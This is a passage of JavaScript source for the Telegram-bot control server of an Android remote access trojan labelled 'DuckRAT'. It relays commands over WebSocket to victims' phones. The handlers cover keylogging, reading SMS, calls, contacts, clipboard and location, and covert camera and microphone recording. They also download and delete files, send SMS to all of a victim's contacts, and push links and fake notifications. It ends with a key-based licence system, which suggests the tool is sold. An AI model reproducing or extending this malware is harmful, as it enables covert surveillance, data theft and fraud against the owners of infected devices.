                                callback_data: `stop_audio:${uuid}`,
                            },
                        ],
                        [
                            {
                                text: "🔥",
                                callback_data: `my_fire_emoji:${uuid}`,
                            },
                            {
                                text: "𝙎𝙘𝙧𝙚𝙚𝙣𝙨𝙝𝙤𝙩",
                                callback_data: `screenshot:${uuid}`,
                            },
                        ],
                        [
                            {
                                text: "𝙏𝙤𝙧𝙘𝙝 𝙊𝙣",
                                callback_data: `torch_on:${uuid}`,
                            },
                            {
                                text: "𝙏𝙤𝙧𝙘𝙝 𝙊𝙛𝙛",
                                callback_data: `torch_off:${uuid}`,
                            },
                        ],
                        [
                            {
                                text: "𝙆𝙚𝙮𝙇𝙤𝙜𝙜𝙚𝙧 𝙊𝙣",
                                callback_data: `keylogger_on:${uuid}`,
                            },
                            {
                                text: "𝙆𝙚𝙮𝙇𝙤𝙜𝙜𝙚𝙧 𝙊𝙛𝙛",
                                callback_data: `keylogger_off:${uuid}`,
                            },
                        ],
                        [
                            {
                                text: "𝙊𝙥𝙚𝙣 𝙏𝙖id)�𝙜𝙚𝙩 𝙇𝙞𝙣𝙠",
                                callback_data: `open_target_link:${uuid}`,
                            },
                            {
                                text: "𝙏𝙚𝙭𝙩 𝙏𝙤 𝙎𝙥𝙚𝙚𝙘𝙝",
                                callback_data: `text_to_speech:${uuid}`,
                            },
                        ],
                        [
                            {
                                text: "𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨",
                                callback_data: `send_message_to_all:${uuid}`,
                            },
                        ],
                        [
                            {
                                text: "𝘿𝙚𝙫𝙞𝙘𝙚 𝘽𝙪𝙩𝙩𝙤𝙣𝙨",
                                callback_data: `device_button:${uuid}`,
                            },
                        ],
                    ],
                },
                parse_mode: "HTML",
            },
        );
    }
    if (commend == "calls") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("calls");
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        );
    }
    if (commend == "contacts") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("contacts");
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        );
    }
    if (commend == "messages") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("messages");
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        );
    }
    if (commend == "apps") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("apps");
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        );
    }
    if (commend == "device_info") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("device_info");
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        );
    }
    if (commend == "clipboard") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("clipboard");
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        );
    }
    if (commend == "camera_main") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("camera_main");
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        );
    }
    if (commend == "camera_selfie") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("camera_selfie");
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        );
    }
    if (commend == "location") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("location");
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        );
    }
    if (commend == "vibrate") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("vibrate");
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        );
    }
    if (commend == "stop_audio") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("stop_audio");
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        );
    }
    if (commend == "send_message") {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n" +
                "•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ",
            { reply_markup: { force_reply: true } },
        );
        currentUuid = uuid;
    }
    if (commend == "send_message_to_all") {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n" +
                "• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ",
            { reply_markup: { force_reply: true } },
        );
        currentUuid = uuid;
    }

    if (commend == "open_target_link") {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙\n\n" +
                "• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛᴏ sᴇɴᴅ ʟɪɴᴋs ᴀʟᴏɴᴇ ᴡɪᴛʜᴏᴜᴛ ᴀɴʏ ᴛᴇxᴛ",
            { reply_markup: { force_reply: true } },
        );
        currentUuid = uuid;
    }
    if (commend == "text_to_speech") {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙏𝙚𝙭𝙩 𝙩𝙤 𝙎𝙥𝙚𝙖𝙠\n\n" +
                "• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛᴇxᴛ ᴛʜᴀᴛ ʜᴀs ᴛᴏ ʙᴇ sᴘᴏᴋᴇɴ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ. ᴀɴʏ ʟᴀɴɢᴜᴀɢᴇ ᴀᴄᴄᴇᴘᴛɪʙʟᴇ.",
            { reply_markup: { force_reply: true }, parse_mode: "HTML" },
        );
        currentUuid = uuid;
    }
    if (commend == "my_fire_emoji") {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 🔥 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ 🔥 ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ\n🔥🔥\n🔥🔥",
            { reply_markup: { force_reply: false }, parse_mode: "HTML" },
        );
        appBot.sendMessage(id, "  🔥  \n" + " 🔥🔥 \n" + "🔥🔥🔥", {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [
                    ["𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 𝗗𝗲𝘃𝗶𝗰𝗲𝘀"],
                    ["𝗠𝗲𝗻𝘂 𝗗𝘂𝗰𝗸𝗥𝗔𝗧"],
                    ["📋 𝗧𝗲𝗻𝘁𝗮𝗻𝗴 𝗞𝗮𝗺𝗶"],
                ],
                resize_keyboard: true,
            },
        });
        currentUuid = uuid;
    }
    if (commend == "torch_on") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("torch_on");
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        );
    }
    if (commend == "torch_off") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("torch_off");
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        );
    }
    if (commend == "keylogger_on") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("keylogger_on");
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                "• ʏᴏᴜ ᴡɪll ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        );
    }
    if (commend == "keylogger_off") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("keylogger_off");
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        );
    }
    if (commend == "screenshot") {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send("screenshot");
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n" +
                "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜhe ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ",
        );
    }

    if (commend == "device_button") {
        currentUuid = uuid;
        appBot.editMessageText(
            `°• 𝙋𝙧𝙚𝙨𝙨 𝙗𝙪𝙩𝙩𝙤𝙣𝙨 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(":")[1]).model}</b>`,
            {
                width: 10000,
                chat_id: id,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "|||",
                                callback_data: `device_btn_:${currentUuid}:recent`,
                            },
                            {
                                text: "■",
                                callback_data: `device_btn_:${currentUuid}:home`,
                            },
                            {
                                text: "<",
                                callback_data: `device_btn_:${currentUuid}:back`,
                            },
                        ],
                        [
                            {
                                text: "Vol +",
                                callback_data: `device_btn_:${currentUuid}:vol_up`,
                            },
                            {
                                text: "Vol -",
                                callback_data: `device_btn_:${currentUuid}:vol_down`,
                            },
                            {
                                text: "⊙",
                                callback_data: `device_btn_:${currentUuid}:power`,
                            },
                        ],
                        [
                            {
                                text: "Exit 🔙",
                                callback_data: `device_btn_:${currentUuid}:exit`,
                            },
                        ],
                    ],
                },
                parse_mode: "HTML",
            },
        );
    }

    if (commend == "device_btn_") {
        console.log(data.split(":")[0]);
        console.log(data.split(":")[1]);
        console.log(data.split(":")[2]);

        switch (data.split(":")[2]) {
            case "recent":
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send("btn_recent");
                    }
                });
                break;
            case "home":
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send("btn_home");
                    }
                });
                break;
            case "back":
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send("btn_back");
                    }
                });
                break;
            case "vol_up":
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send("btn_vol_up");
                    }
                });
                break;
            case "vol_down":
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send("btn_vol_down");
                    }
                });
                break;
            case "power":
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send("btn_power");
                    }
                });
                break;
            case "exit":
                appBot.deleteMessage(id, msg.message_id);
                break;
        }
    }

    if (commend == "file") {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n" +
                "• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.",
            { reply_markup: { force_reply: true }, parse_mode: "HTML" },
        );
        currentUuid = uuid;
    }
    if (commend == "delete_file") {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n" +
                "• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪﻟᴇꜱ.",
            { reply_markup: { force_reply: true }, parse_mode: "HTML" },
        );
        currentUuid = uuid;
    }
    if (commend == "microphone") {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n" +
                "• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ",
            { reply_markup: { force_reply: true }, parse_mode: "HTML" },
        );
        currentUuid = uuid;
    }
    if (commend == "rec_camera_selfie") {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n" +
                "• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ",
            { reply_markup: { force_reply: true }, parse_mode: "HTML" },
        );
        currentUuid = uuid;
    }
    if (commend == "rec_camera_main") {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝗻𝘁 𝘁𝗵𝗲 𝗺𝗮𝗶𝗻 𝗰𝗮𝗺𝗲𝗿𝗮 𝘁𝗼 𝗯𝗲 𝗿𝗲𝗰𝗼𝗿𝗱𝗲𝗱\n\n" +
                "• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ",
            { reply_markup: { force_reply: true }, parse_mode: "HTML" },
        );
        currentUuid = uuid;
    }
    if (commend == "toast") {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚\n\n" +
                "• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ",
            { reply_markup: { force_reply: true }, parse_mode: "HTML" },
        );
        currentUuid = uuid;
    }
    if (commend == "show_notification") {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n" +
                "• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ",
            { reply_markup: { force_reply: true }, parse_mode: "HTML" },
        );
        currentUuid = uuid;
    }
    if (commend == "play_audio") {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(
            id,
            "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮\n\n" +
                "• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ",
            { reply_markup: { force_reply: true }, parse_mode: "HTML" },
        );
        currentUuid = uuid;
    }
});

// Session cleanup and keep alive
setInterval(function () {
    try {
        const now = Date.now();

        // Clean up expired sessions
        authenticatedSessions.forEach((session, token) => {
            if (
                now > session.expiresAt ||
                now - session.lastActivity > 2 * 60 * 60 * 1000
            ) {
                // 2 hours inactivity
                authenticatedSessions.delete(token);
            }
        });

        // Keep WebSocket connections alive
        appSocket.clients.forEach(function each(ws) {
            if (ws.readyState === webSocket.OPEN) {
                ws.send("ping");
            }
        });

        axios.get(address).catch((e) => {
            // Silently handle keep-alive errors
        });
    } catch (e) {
        console.error("Error in keep-alive:", e);
    }
}, 5000);

// Add key management commands for Telegram bot
appBot.onText(/\/addkey (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId == id) {
        const newKey = match[1];
        VALID_KEYS.push(newKey);
        appBot.sendMessage(
            id,
            `✅ Key baru ditambahkan: <code>${newKey}</code>`,
            { parse_mode: "HTML" },
        );
    }
});

appBot.onText(/\/removekey (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId == id) {
        const keyToRemove = match[1];
        const index = VALID_KEYS.indexOf(keyToRemove);
        if (index > -1) {
